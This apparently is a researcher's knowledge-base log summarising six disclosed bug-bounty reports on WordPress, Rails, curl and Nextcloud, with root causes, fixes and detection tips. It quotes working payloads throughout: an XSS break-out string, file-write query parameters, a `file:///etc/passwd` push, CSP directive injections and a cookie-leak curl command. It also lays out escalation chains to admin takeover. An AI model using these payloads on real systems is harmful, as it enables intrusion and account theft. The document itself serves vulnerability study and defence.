SOURCE: https://hackerone.com/reports/3931771  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3931771.json` — HTTP 200, `visibility: full`, `vulnerability_information` 21,739 B read IN FULL (FIRST route worked). Metadata: WordPress, "Author -> stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`", reporter `jakubk`, created 2026-08-11, disclosed 2026-08-28, weakness Stored XSS. Same reporter's SIBLING report #3931777 (the file-DELETION sink, ALREADY recorded at §17.478) uses the SAME `finalize_item()` write primitive but a DIFFERENT sink.
STATUS: UNVERIFIED (not reproduced — no WordPress lab stood up this pass; the author's headless-Chromium execution is quoted, not re-run here)
CLASS: stored XSS (cross-privilege Author -> Administrator) — a media-metadata finalize endpoint stores an attacker-controlled filename-ish field (`sub_sizes[].file`) VERBATIM (bypassing `sanitize_file_name()`), it is string-concatenated into an image URL and echoed into a single-quoted `src` attribute with NO escaping -> attribute + element break-out -> stored XSS in wp-admin
CORE METHOD:
  1. WRITE (unsanitized): `POST /?rest_route=/wp/v2/media/<id>/finalize`, `Content-Type: application/json`, body `{"sub_sizes":[{"image_size":"thumbnail","file":"<PAYLOAD>","width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}`. `finalize_item()` (`class-wp-rest-attachments-controller.php:2920-2926`) stores `$metadata['sizes'][$image_size]['file'] = $sub_size['file']` VERBATIM — schema is only `array('type'=>'string')`, "no `sanitize_file_name()`, no `pattern`, no `sanitize_callback`". This BYPASSES the historical filename-XSS mitigation (`sanitize_file_name()` on upload) because the value never touches the upload path. Permission = `edit_media_item_permissions_check` = `current_user_can('upload_files')` + `edit_post` on its own attachment — an Author satisfies both.
  2. PROPAGATION: `image_get_intermediate_size()` (`wp-includes/media.php:854-858`) does `$data['url'] = path_join(dirname($file_url), $data['file'])` — the raw value concatenated into the image URL untouched.
  3. SINK (no escaping): `get_media_item()` (`wp-admin/includes/media.php:1602-1610`/`:1716`) builds `<img class='thumbnail' src='$thumb_url' alt='' />` — NO `esc_url()`, NO `esc_attr()`. Payload `a.jpg' /><svg onload='document.title="XSS-"+document.domain'></svg><b x='` closes the single-quoted `src`, closes the `<img>`, injects `<svg onload>`.
  4. REACHABLE PAGE: `get_media_items()` renders EVERY attachment via `GET /wp-admin/media-upload.php?tab=library` — a nonce-less `GET` gated only by `current_user_can('upload_files')`. One poisoned attachment fires for every Administrator who opens that screen (legacy "Add Media" iframe / lure link / iframe). Modern `upload.php` grid + `post.php?post=<id>&action=edit` ESCAPE the value (verified NOT affected); only the legacy popup renders raw.
  5. Author's lab: payload stored + break-out + `document.title` rewritten in a real headless-Chromium Administrator session on the genuine wp-admin URL (WP trunk AND 7.0.2 + Gutenberg 23.6.0).
DETECTION SIGNAL: a media/attachment pipeline with a separate finalize/commit step whose JSON body carries a filename-ish field (`sub_sizes[].file`, `sizes[*].file`, `original_image`) accepted VERBATIM (no `sanitize_file_name`/basename); a render path that string-concatenates that field into a URL and echoes it into a single-quoted HTML attribute with no `esc_url`/`esc_attr`; a nonce-less admin GET (`media-upload.php?tab=library`) listing every object. Tell: value stored without passing the normal filename sanitizer, then rendered unescaped in an attribute.
CHAIN: Author (upload_files + edit_post on own upload, NO `unfiltered_html`) uploads a real JPEG (201) -> `POST /wp/v2/media/<id>/finalize` with `sub_sizes[].file = "a.jpg' /><svg onload=…></svg><b x='"` (primitive: metadata write bypasses `sanitize_file_name()`) -> value concatenated into URL and echoed unescaped into `src='…'` in `get_media_item()` (primitive: attribute/element break-out stored XSS) -> any Administrator opens `GET /wp-admin/media-upload.php?tab=library` (nonce-less) -> injected `onload` runs in the Administrator's `wp-admin` origin (cross-privilege Author -> Administrator) -> read admin nonces / `user-new.php` create-admin / install plugin / edit theme = full site compromise (terminal: stored XSS with admin/session impact, less-privileged -> higher-privileged).
TRANSFERABLE TEST: on any WordPress with client-side media processing (any HTTPS site; Author account): (1) `POST /?rest_route=/wp/v2/media` a real JPEG (201, note `id`); (2) `POST /wp/v2/media/<id>/finalize` with `{"sub_sizes":[{"image_size":"thumbnail","file":"x.jpg' /><svg onload='…'></svg><b x='","width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}`; (3) as Administrator `GET /wp-admin/media-upload.php?tab=library`, inspect for the broken-out `src='…' /><svg onload=…`; (4) execute in headless Chromium with the admin cookie. General rule: **when a metadata field that should be a filename is stored verbatim (bypassing `sanitize_file_name`) and later echoed into an unescaped HTML attribute, poison the field to break out — the filename sanitizer only guards the upload path, not a metadata-write endpoint.** Check EVERY render surface: the modern grid/list may escape while the legacy popup does not.
DEDUPE/DELTA: tokens `3931771`, `get_media_item`, `139245`, `image_get_intermediate_size` = 0 hits across the three write targets immediately before append (pre-existing `sub_sizes`/`finalize_item`/`media-upload.php` hits = the recorded SIBLING #3931777 file-DELETION entry at §17.478 + ledger ~14686/20227 — reviewed and NOT conflated: same reporter, same `finalize_item()`->`sub_sizes[].file` verbatim WRITE primitive, but a DIFFERENT sink/class — §17.478 is `wp_delete_attachment_files()` arbitrary file DELETION -> site takeover; THIS entry is the `get_media_item()` unescaped-`src` output sink -> stored XSS; the report itself files them separately). Recorded neighbours REVIEWED and NOT conflated: the filename-as-XSS-carrier family (Mailcow quarantine filename §17.229, FUDforum attachment filename ledger 15667, MTN #1264832 baseline filename breakout declined batch 274) — those store a malicious FILENAME via upload/Content-Disposition; here the payload never touches `sanitize_file_name()` (written straight into attachment METADATA via finalize), and the sink is a specific unescaped single-quoted `src` in `get_media_item()`. §17.148 attribute-breakout-in-server-side-HTML = the recorded class; this is a NEW carrier + NEW entry point (metadata-finalize bypass) with cross-privilege escalation. NEW: the metadata-finalize write that sidesteps `sanitize_file_name()`, and the `get_media_item()` legacy-popup unescaped-`src` sink.
FRESHNESS: created 2026-08-11, disclosed 2026-08-28 — INSIDE the preferred 6-12 month window (fresh). read because assigned.
HONESTY: not reproduced (knowledge intake only; no WordPress install stood up, no admin session driven). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (21,739 B). The headless-Chromium `document.title` output is the report's own evidence, not re-executed here.

SOURCE: https://hackerone.com/reports/3553340  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3553340.json` — HTTP 200, `visibility: full`, `vulnerability_information` 6,208 B read IN FULL (FIRST route worked). Metadata: Ruby on Rails, "Active Storage Vips Transformer Missing validate_transformation — CVE-2025-24293 Incomplete Fix", reporter `friedchicken112211`, created 2026-02-13, disclosed 2026-07-30, weakness Path Traversal.
STATUS: UNVERIFIED (not reproduced — no Rails lab/Docker stood up this pass; the report's Docker PoC is quoted, not run here)
CLASS: arbitrary file write + arbitrary image read (path traversal) via incomplete-fix sibling transformer — the CVE-2025-24293 fix added `validate_transformation` (method allowlist + argument denylist) to the ImageMagick transformer ONLY; the Vips transformer (the DEFAULT `variant_processor` since Rails 7.0) never got it and still forwards any transformation name (except `combine_options`) to `Vips::Image` via `public_send`, so `write_to_file` writes a processed image to an attacker path and `source` overrides the pipeline input to read another image
CORE METHOD:
  1. ENTRY (same shape as recorded CVE-2022-21831 #1154034): an app passing untrusted input to `blob.variant()` as a Hash — `<%= image_tag blob.variant(params[:t] => params[:v]) %>`. Request `GET /images/variant?t=write_to_file&v=/app/public/uploads/evil.png` (or `?t=source&v=/path/to/other_image.jpg`). Hash input bypasses `Variation.decode` signing (a raw Hash is not a signed variation token).
  2. THE FIX GAP: `image_magick.rb` overrides `validate_transformation` with `ActiveStorage.supported_image_processing_methods` (allowlist) + `unsupported_image_processing_arguments` (denylist) — hardened by CVE-2025-24293 (Aug 2025). `vips.rb` does NOT override it — the whole file is `class Vips < ImageProcessingTransformer; def processor; ImageProcessing::Vips; end; end`. It inherits base `ImageProcessingTransformer#validate_transformation`, which only rejects `combine_options`. Vips is the DEFAULT since Rails 7.0 (`config.load_defaults "7.0"` sets `active_storage.variant_processor = :vips`), so default Rails 7+ apps are on the UN-hardened path.
  3. THE SINK: `validate_transformation(:write_to_file, "/tmp/pwned.png")` passes (name != `combine_options`) -> `Chainable#apply` `method_missing(:write_to_file)` records a pipeline op -> `Processor#apply_operation` `respond_to?(:write_to_file)` is false -> `@accumulator.public_send(:write_to_file, "/tmp/pwned.png")` -> `Vips::Image#write_to_file` EXECUTES = arbitrary processed-image FILE WRITE (report's Docker PoC confirms `/tmp/pwned.png` created). `source: "/path/to/other_image"` overrides pipeline input = arbitrary image READ (limited to valid image files).
  4. LIMITS (report verbatim): "Written content is always image data — the attacker cannot write arbitrary content (no scripts, configs, or HTML)"; non-image extensions raise `Vips::Error`; "This is NOT RCE (unlike CVE-2025-24293's MiniMagick CLI injection)."
DETECTION SIGNAL: a variant/transform API passing a user-controlled transformation NAME (and/or argument) to `blob.variant()`/`preview()`; TWO sibling transformers where only ONE overrides `validate_transformation` (diff `image_magick.rb` vs `vips.rb`); `config.load_defaults "7.0"` (Vips default). Tell: a security fix that hardened one processor/transformer but left the DEFAULT sibling with the base-class NOOP validator.
CHAIN: app passes untrusted params to `blob.variant(params[:t] => params[:v])` (Hash input bypasses `Variation.decode` signing) -> `?t=write_to_file&v=<attacker path>` reaches `Vips::Image#write_to_file` because the Vips transformer's `validate_transformation` only blocks `combine_options` (bypass: the CVE-2025-24293 allowlist/denylist never reached the default Vips processor) -> arbitrary processed-image file WRITE to any path with a recognized image extension -> image defacement / cross-user avatar overwrite (IDOR) / public-asset corruption (logo/favicon) / disk exhaustion; `?t=source&v=<other image>` -> arbitrary image READ (other users' uploads). Terminal per report: integrity loss (defacement/IDOR overwrite) + limited confidentiality (image read) — bounded (image data only, NOT RCE).
TRANSFERABLE TEST: on any Rails app using Active Storage + `image_processing`, (1) find a `blob.variant(params[...] => params[...])` / `preview()` call with user-controlled input; (2) check which `variant_processor` is active (Rails 7.0+ default = `:vips`); (3) send `?t=write_to_file&v=/tmp/pwned.png` and `?t=source&v=<other-user-image>` — confirm file creation / foreign-image read; (4) diff sibling transformers: if `image_magick.rb` overrides `validate_transformation` but `vips.rb` (or the active processor) does not, the fix is incomplete. General rule: **after a security fix that hardens one implementation, audit EVERY sibling processor/transformer/mode and re-test through the DEFAULT one — a fix applied to ImageMagick but not Vips leaves the default Rails 7+ path exploitable.**
DEDUPE/DELTA: tokens `3553340`, `write_to_file`, `validate_transformation`, `Vips`, `variant_processor`, `CVE-2025-24293` = 0 technique hits across the three write targets immediately before append (pre-existing `Active Storage`/`image_processing` hits reviewed and NOT conflated: §17.273 / #1154034 / #1652042 (CVE-2022-21831) records the Rails `variant()` code/argument-injection -> RCE via the MINIMAGICK `convert` CLI (`method_missing` -> `-write /tmp/file.erb`, array-arg splat, `?t=write&v=…`); the Active Storage blob `Set-Cookie`+`Cache-Control: public` session leak (CVE-2024-26144, §17.119); the ActiveStorage `key` traversal (ledger ~12135)). THIS entry is the same PRIMITIVE (user-controlled variant operation name) but the VIPS backend SURVIVED the fix — the CVE-2025-24293 allowlist/denylist reached `image_magick.rb` only, so `write_to_file`/`source` remain live on the DEFAULT Vips processor. NEW: the incomplete-fix-sibling/default-processor audit + `write_to_file` arbitrary-file-write / `source` arbitrary-image-read ops + the "Hash input bypasses `Variation.decode` signing" rung. Recorded as a distinct actionable delta (prevents the false negative "variant() is fixed after the CVE"), NOT a re-derivation of the MiniMagick CLI technique.
FRESHNESS: created 2026-02-13, disclosed 2026-07-30 — INSIDE the preferred 6-12 month window (fresh). read because assigned.
HONESTY: not reproduced (knowledge intake only; the Docker `poc.rb`/`Dockerfile` in the report was NOT built or run here). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (6,208 B). The "NOT RCE" limit is the report's own, stated honestly.

SOURCE: https://hackerone.com/reports/3674275  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3674275.json` — HTTP 200, `visibility: full`, `vulnerability_information` 5,513 B read IN FULL (FIRST route worked). Metadata: curl, "lib/http2.c: SSL connections accept non-HTTP push schemes (incomplete fix for 2e8c922a)", reporter `hybirdss`, created 2026-04-15, disclosed 2026-04-16, weakness "Authentication Bypass by Primary Weakness".
STATUS: UNVERIFIED (not reproduced — no libcurl H2-push lab stood up this pass; the report's `PUSH URL: file:///etc/passwd` output is quoted, not re-run here)
CLASS: client-side scheme-validation bypass (scheme confusion): an HTTPS server's PUSH_PROMISE `:scheme` pseudo-header is validated only on the NON-TLS branch, so over TLS any scheme lands in the pushed handle's effective URL — a spoofed `file://` LABEL on server-delivered content -> cache-key poisoning / scheme-based security-logic bypass in downstream apps (NOT local file read — the report bounds it)
CORE METHOD:
  1. THE GAP (report): `set_transfer_url()` in `lib/http2.c` validates the `:scheme` of PUSH_PROMISE frames only when `!via_ssl_conn` — the guard from commit `2e8c922a` (2026-03-27) blocks non-TLS connections from accepting TLS-scheme pushes; "The symmetric case was not addressed: over TLS, `via_ssl_conn` is TRUE, the guard at line 735 is skipped, and `curl_url_set(u, CURLUPART_SCHEME, v, 0)` is called at line 743 with whatever scheme the server supplied." In default builds (`CURL_DISABLE_FILE=OFF`) `Curl_get_scheme("file")` returns a valid scheme with a non-NULL `run` pointer, so `curl_url_set` returns `CURLUE_OK` and the push handle URL becomes `file:///etc/passwd`.
  2. PoC (report): a python `h2` TLS server (ALPN `h2`) that on `StreamEnded` of the client request calls `conn.push_stream(client_id, 2, [(':method','GET'),(':scheme','file'),(':path','/etc/passwd'),(':authority','127.0.0.1:<PORT>')])` and sends body `injected` on stream 2; the libcurl client sets `CURLMOPT_PUSHFUNCTION`, accepts the push and prints `CURLINFO_EFFECTIVE_URL`. Confirmed output (libcurl/8.19.0 nghttp2/1.68.1, transfer `result=0`): `PUSH URL: file:///etc/passwd`.
  3. THE LIMIT (report, verbatim): "The server does not gain local file read — pushed data comes from the H2 stream" — only the LABEL is spoofed; the bytes are the server's own. Precondition (report): "application sets CURLMOPT_PUSHFUNCTION (non-default) and callback accepts the push"; the official `CURLMOPT_PUSHFUNCTION.md` example (line 117) validates only `:path`, "making it directly exploitable".
  4. THE IMPACT (report): apps keying "response caches, routing decisions, or audit logs on the effective URL" process server-crafted content under a spoofed `file://` label — "cache poisoning, scheme-based security logic bypass, misleading audit logs". Suggested fix: mirror the non-SSL guard for `via_ssl_conn` (permit only `http`/`https`).
DETECTION SIGNAL: any HTTP/2 client that accepts server pushes and reads the pushed stream's effective/final URL; a scheme guard sitting on only ONE branch of a transport condition (`if(via_ssl_conn){...} else {<guard>}`); URL scheme/authority flowing into cache keys, routing or trust decisions. Oracle: a push whose `:scheme` is `file`/`javascript`/`data` surviving into `CURLINFO_EFFECTIVE_URL` = the label is server-controlled.
CHAIN: malicious HTTPS server -> PUSH_PROMISE with a non-HTTP `:scheme` over TLS (the `!via_ssl_conn` guard is skipped — commit `2e8c922a` fixed the non-TLS direction only) -> the pushed stream's effective URL = `file:///etc/passwd` while the body is server content (primitive: URL-label spoof on server-delivered content) -> an app cache keyed on the effective URL stores server bytes under the `file://` label / security logic that treats `file://` as local-trusted accepts server bytes / audit logs record a false origin (terminal per report: cache poisoning, scheme-based security-logic bypass, misleading audit logs — the label spoof is demonstrated; the downstream impacts are the report's documented abuse paths, conditional on the app pattern).
TRANSFERABLE TEST: (1) run the report's h2-TLS push server against any libcurl/H2 integration that accepts pushes and read the push handle's effective URL — any non-HTTP scheme accepted = the bug; (2) if the app keys a cache/routing/audit on it, plant an entry and trigger the consumer; (3) audit every `if (transport) <scheme guard>` for the UNGUARDED symmetric branch and replay the fix's own test in the opposite direction. Rule: **the scheme/authority label of server-delivered content is server-controlled metadata — never key caches or security decisions on it, and when a security guard is added for one direction of a symmetric condition, the other direction is the bypass.**
DEDUPE/DELTA: tokens `3674275`, `PUSH_PROMISE`, `CURLMOPT_PUSHFUNCTION`, `via_ssl_conn`, `2e8c922a`, `CURLINFO_EFFECTIVE_URL` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.761 (Rails Vips — "a fix that hardens one sibling implementation but not the default one" is the SAME audit heuristic in sibling-implementation shape; here it is the symmetric-branch shape — recorded as a DELTA carrier, NO §17 slot); §17.712 (client-side scheme-validation bypass via `&#58` in a colon-split — XSS-side, different mechanism); §17.721 (cache poisoning via an unkeyed INPUT — here the poisoned dimension is the server-supplied URL LABEL). NEW: H2 PUSH_PROMISE `:scheme` spoofing as a recorded carrier + the "effective-URL label poisons downstream trust" rule + the symmetric-guard incomplete-fix shape.
FRESHNESS: created 2026-04-15, disclosed 2026-04-16 — INSIDE the preferred 6-12 month window (fresh). read because assigned.
HONESTY: not reproduced (knowledge intake only; the report's h2 server + libcurl client were not built or run here). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (5,513 B). The report's own bound ("The server does not gain local file read") is carried into the entry — no file-read impact is claimed.

SOURCE: https://hackerone.com/reports/3516878  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3516878.json` — HTTP 200, `visibility: full`, `vulnerability_information` 4,693 B read IN FULL (FIRST route worked). Metadata: curl, "Cross-origin cookies leak and injection risk when using a custom Host header", reporter `b4c90000040c1287364ccde6de680`, created 2026-01-19, disclosed 2026-01-20, weakness "Insufficiently Protected Credentials"; tested on curl 8.18.0.
STATUS: UNVERIFIED (not reproduced — no two-port curl harness run this pass; the report's transcript is quoted, not re-run here)
CLASS: cross-origin session-cookie leak + cookie injection (session fixation) — the client's cookie engine keys cookies to a `cookiehost` derived from a caller-set `Host:` header; `cookiehost` is not cleared on redirects, so it persists across CROSS-ORIGIN redirects: the spoofed host's cookies are SENT to the foreign origin (leak) and the foreign origin's `Set-Cookie` is FILED under the spoofed host (injection)
CORE METHOD:
  1. THE BINDING (report code quotes): `lib/http.c http_set_aptr_host` — `ptr = Curl_checkheaders(data, STRCONST("Host")); if(ptr && (!data->state.this_is_a_follow || curl_strequal(data->state.first_host, conn->host.name))) {... copy_custom_value(ptr, &cookiehost); ... aptr->cookiehost = cookiehost;}` — a custom `Host:` header becomes the cookie-matching host (CURLOPT_HTTPHEADER docs, verbatim: "The specified hostname is used for cookie matching if the cookie engine is also enabled for this transfer" — and the docs contain "no explicit warning that this also applies in cross-origin redirects").
  2. THE USE (report): `http_header_s` feeds `cookiehost` to `Curl_cookie_add(... host ...)` when processing `Set-Cookie`; `http_cookies` feeds it to `Curl_cookie_getlist(... host ...)` when building the `Cookie:` header — "Since cookiehost is not cleared on redirects this behaviour persists across cross-origin redirects."
  3. THE REPRO (report, verbatim): `curl -v -L -c cookies.txt -H "Host: example.com" --resolve b.com:8001:127.0.0.1 --resolve a.com:8000:127.0.0.1 a.com:8000` — hop 1 (a.com:8000 302 -> `Location: http://b.com:8001/`) sends `Set-Cookie: ccc=secret`, logged "Added cookie ccc=\"secret\" for domain example.com"; the cross-origin hop to b.com:8001 then SENDS `> Cookie: ccc=secret` (leak); b.com's `Set-Cookie: bbb=test` is again "Added cookie bbb=\"test\" for domain example.com"; the return to `http://a.com:8000/check` carries `> Cookie: bbb=test; ccc=secret`; `cookies.txt` lists BOTH under `example.com`.
  4. THE TWO ARMS: (a) LEAK — every cookie filed under the spoofed host rides along to ANY cross-origin redirect target (session token to an attacker origin); (b) INJECTION — `Set-Cookie` from ANY redirect target is filed under the spoofed host and replayed on later requests to it (session fixation / CSRF-token or feature-flag overwrite).
DETECTION SIGNAL: an HTTP client (app, SDK, scanner, SSRF-style URL fetcher, webhook/link-preview service, API client pinned to an IP) that (a) sets a custom `Host:`/`:authority` override, (b) has the cookie engine ON, (c) follows redirects across origins. Oracle: a cookie set by hop N's origin appearing in hop N+1's request to a DIFFERENT origin, or a foreign `Set-Cookie` landing in the jar under the ORIGINAL host (the jar file / `Cookie:` header tells you).
CHAIN: client fetches `http://a/` with `Host: example.com` + cookies + redirect-follow (precondition: custom Host + cookie engine + cross-origin redirect) -> a.com (attacker-controlled or compromised hop) redirects cross-origin to b.com (primitive: `cookiehost` survives the origin change) -> example.com's cookies incl. the session token are sent to b.com = session theft -> replay against example.com = account takeover (terminal: ATO / session hijack); INJECTION arm: b.com's `Set-Cookie` is filed under example.com and replayed on later requests -> session fixation or CSRF-token/flag overwrite -> ATO. Any server-side fetcher of attacker-supplied URLs that overrides Host leaks its own jar cross-origin.
TRANSFERABLE TEST: stand up the report's two-port harness (302 :8000 -> :8001, `Set-Cookie` on both hops) and run its exact `curl -v -L -c cookies.txt -H "Host: example.com" --resolve ...` command; then sweep every URL-fetching integration on real targets (webhooks, link previews, scrapers, mobile BFF, SSRF-style forgers) that overrides Host with cookies + redirects and watch where the jar lands. Rule: **cookie storage identity must bind to the connection's real authority — a header-derived host must not outlive the redirect it was set on, or cookies both leak to and can be injected from foreign origins (theft AND fixation from one defect).**
DEDUPE/DELTA: tokens `3516878`, `cookiehost`, `http_set_aptr_host`, `Curl_cookie_add`, `Curl_cookie_getlist`, `custom Host` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: cookie tossing (header-injection session fixation — RESPONSE-side `Set-Cookie` injection), Cookie Chaos (cookie NAME normalisation `__Host-`/`$Version=1`), the `__Host-`/`__Secure-` prefix bypass (U+2000 name confusion), the CRLF/Unicode `Set-Cookie` injection (ton.twitter.com `auth_token` carrier), §11.4 host-header reset-link poisoning (server-side EMAIL link, not a client cookie engine), §17.119 (server-side caching of `Set-Cookie` on Active Storage blobs). NEW: the CLIENT-side cookie-identity binding defect — cookie scope keyed to a request header that persists across cross-origin redirects — recorded with both arms (leak + injection).
FRESHNESS: created 2026-01-19, disclosed 2026-01-20 — INSIDE the preferred 6-12 month window (fresh). read because assigned.
HONESTY: not reproduced (knowledge intake only; nothing sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (4,693 B).

SOURCE: https://hackerone.com/reports/3137895  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3137895.json` — HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (researcher body withheld at disclosure). Recovery ladder: `web_extract` on the live report page = timeline + team summary only; the summary NAMES the credited public writeup, so the ladder stopped there (browser / r.jina.ai / Wayback not needed). ROUTE THAT WORKED: the CREDITED PUBLIC WRITEUP = the vendor security advisory GHSA-w787-vwqp-8wr7 (report summary, verbatim: "Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-w787-vwqp-8wr7") fetched via the GitHub API this pass (description read IN FULL) + its linked patch PR #1810 / commit 39f24a6 raw `.patch` diff read IN FULL (13,464 B) + the CVE record CVE-2025-66551. Metadata: Nextcloud, "Missing ownership check in Tables app allows moving columns into tables of other users", reporter `daroo`, created 2025-05-10, disclosed 2025-12-05, weakness IDOR (CWE-639), severity Medium 6.3 `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:L`, bounty awarded; fixed in Tables 0.8.6 / 0.9.3.
STATUS: UNVERIFIED (not reproduced — no Nextcloud lab stood up this pass)
CLASS: IDOR / authorization bypass through user-controlled key (CWE-639) — a column UPDATE call accepts a caller-supplied DESTINATION `tableId` alongside the column id and re-parents the column into that table with NO ownership/share check on the destination: a low-privilege user injects their own columns into any victim's table structure (integrity High, confidentiality None)
CORE METHOD:
  1. THE FLOW (advisory, verbatim): "A malicious user was able to create their own table and then move a column to a victims table." (CVE-2025-66551; "Prior to 0.8.6 and 0.9.3 ... fixed in 0.8.6 and 0.9.3"; workaround "Disable app Tables".)
  2. THE GAP (patch diff, verbatim): `ColumnService::update(int $columnId, ?int $tableId, ?string $userId, ColumnDto $columnDto)` carried `?int $tableId` and did `if ($tableId !== null) { $item->setTableId($tableId); }` — the column is re-parented onto the caller-chosen table with no check that the caller owns/can-write the DESTINATION. The removed private `ColumnController::update` (`PUT /column/{id}`, `appinfo/routes.php`) forwarded the caller's `tableId` into that call. FIX (commit 39f24a6 / PR #1810): the `?int $tableId` parameter and the `setTableId` block are REMOVED from `ColumnService::update` (and the private `ColumnController`, 275 lines, is deleted outright) — the fix shape is "an update must not move an object across containers; a move is a separate authorized verb".
  3. ATTACK (advisory + CVE record): any authenticated user (PR:L, table-create rights) creates own table + column -> issues the column-update request carrying `tableId` = the victim's table id -> the column appears in the victim's table. CVE record: "a malicious user was able to create their own table and then move a column to a victims table"; C:N / I:H / A:L — integrity of victim tables only, no data read.
  4. AFFECTED (advisory): Tables >= 0.4.0 (< 0.8.6) and >= 0.9.0 (< 0.9.3).
DETECTION SIGNAL: any update/move/reassign/migrate API carrying BOTH an object id AND a destination/parent container id (`tableId`, `parentId`, `folderId`, `projectId`, `groupId`) where the authorization check covers only the object being moved; the `if (<dest> !== null) $item->set<Container>Id(<dest>)` code shape is the static tell. Oracle: your own object ending up inside a container you cannot write.
CHAIN: authenticated low-priv user creates own table + column (precondition: any account, PR:L, UI:R) -> the column-update request carries `tableId` = the victim's table id (primitive: destination id is caller-controlled and unchecked) -> `setTableId()` re-parents the column into the victim's table (terminal: cross-tenant structure corruption — CVSS I:H; the victim's table gains attacker-controlled columns/fields; C:N — no data disclosure demonstrated). Escalation lead (not documented in the source): where columns drive formulas/views/exports, injected columns are a step toward content injection into victims' derived views.
TRANSFERABLE TEST: on every move/re-parent/reassign flow (tables/columns, files/folders, boards/cards, issues/projects, rows/sheets): create object O owned by account A; capture A's update/move request; add or change the DESTINATION container id to a container owned by account B; replay with A's session; open B's container — O inside it (B's structure changed) = the bug. Also test the mirror (swap the OBJECT id to B's object = the destructive re-parent family) and diff B's derived views/exports. Rule: **an update that can change an object's PARENT must authorize the DESTINATION container (ownership or write-share) — checking the moved object's own ownership is not enough; moves should be a separate, destination-checked verb.**
DEDUPE/DELTA: tokens `3137895`, `CVE-2025-66551`, `columnService`, `setTableId`, `GHSA-w787-vwqp-8wr7` = 0 technique hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.740 (Discourse — per-REFERENCED-ID authorization on relationship mutations; the SAME general rule "a referenced ID in a write must pass the same visibility+edit check as the anchor" — this entry is a DELTA carrier: the unchecked referenced id is the DESTINATION container of a move, not a relationship-array member — NO §17 slot); #227522 (Radancy destructive re-parent IDOR — the MIRROR direction: swapping the edited OBJECT's id moves the foreign object INTO the attacker's account (theft); here the attacker's own object lands in the VICTIM's container (injection) — #227522's "watch WHERE THE OBJECT ENDS UP" rule covers both directions, but the destination-parameter test is its own atom); §17.741 (same Nextcloud Tables app — share-ACL LISTING read IDOR, different endpoint/class); GitLab import foreign-key reassignment (ledger ~2368 — mass-assignment import path). NEW atoms: the destination-`tableId`-on-update carrier, the `if ($tableId !== null) $item->setTableId($tableId)` static tell, the fix shape (drop the destination parameter; moves = separate authorized verb).
FRESHNESS: created 2025-05-10, disclosed 2025-12-05 — INSIDE the preferred 6-12 month window on disclosure (~11.3 months; fresh). read because assigned.
HONESTY: the researcher body is withheld (`visibility: no-content`, VI 0 B) on the live `.json` and the live page renders only the timeline + team summary — the METHOD above comes from the CREDITED public writeup chain the report itself names (GHSA-w787-vwqp-8wr7 via the GitHub API + commit 39f24a6 / PR #1810 patch diff read IN FULL + CVE-2025-66551), NOT invented report content. The original PoC request body is not public (the `ColumnController::update` source is deleted in the patch), so the request shape is reconstructed from the diff and marked UNVERIFIED. Not reproduced; nothing sent to Nextcloud or any target.


SOURCE: https://hackerone.com/reports/2905532  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/2905532.json` — HTTP 200, `visibility: full`, but `vulnerability_information` is only a 485 B stub (Summary + Impact) that credits the original report https://hackerone.com/reports/2440762 (live `.json` = HTTP 404, merged) and the Rails advisory. Metadata: Internet Bug Bounty, "[CVE-2024-54133] Possible Content Security Policy bypass in Action Dispatch", reporter `ryotak`, created 2024-12-18, disclosed 2025-02-06, weakness XSS-Generic; affected actionpack >=5.2.0 <7.0.8.7 / >=7.1.0 <7.1.5.1 / >=7.2.0 <7.2.2.1 / >=8.0.0 <8.0.0.1.
STATUS: UNVERIFIED (not reproduced — no Rails app exercised this pass)
CLASS: security-policy header injection -> CSP bypass (client-side security-control neutralization; a CHAIN-ONLY escalator that turns a CSP-blocked XSS into live script execution)
CORE METHOD:
  1. THE GAP: Action Pack's `content_security_policy` builder (`actionpack/lib/action_dispatch/http/content_security_policy.rb`, `build_directive`/`resolve_source`) interpolated directive VALUES verbatim into the `Content-Security-Policy` header with NO validation — the pre-fix `build_directive(sources, context)` was just `sources.map { |source| resolve_source(source, context) }`. A value containing `;` terminates the current directive and starts a NEW one; whitespace splits one value into extra sources. Any app that sets a CSP directive from untrusted input (dynamic allowed-source lists, tenant-configurable origins, user-influenced `report_uri`) passes attacker text straight into the policy.
  2. THE INJECTION (patch test, verbatim): `@policy.base_uri "https://some.url; script-src https://other.url"` — before the fix this emitted `base-uri https://some.url; script-src https://other.url`, i.e. the attacker appends ARBITRARY directives; `"https://some.url https://other.url"` smuggles an extra source through a single-value API. Escalation payloads: `x; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:` / `x; default-src *` / `x; script-src-elem *` — neutralize the policy (including nonce directives) while the app's own earlier directives stay intact.
  3. THE FIX (commit 2e3f41e, "Add CSP directive validation"): `validate(directive, resolved_sources)` raises `InvalidDirectiveError` when a source `include?(";")` or `source != source.gsub(/[[:space:]]/, "")`. Fix-shape lesson: a policy BUILDER must reject the delimiters of its own grammar.
  4. IMPACT (advisory, verbatim): "carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks." Workaround (verbatim): "avoid setting CSP headers dynamically from untrusted input, or can validate/sanitize that input."
DETECTION SIGNAL: a response whose `Content-Security-Policy` / `-Report-Only` value varies with user input (per-tenant allow-lists, custom domains, `report-uri`, allowed-origin settings); oracle: submit `aaa;bbb` and `aaa bbb` (plus `%3b`/`%20`/newline variants) into every input that reaches the policy and diff `curl -sI` — a NEW `bbb` directive or an extra source appearing = the control is an injection sink.
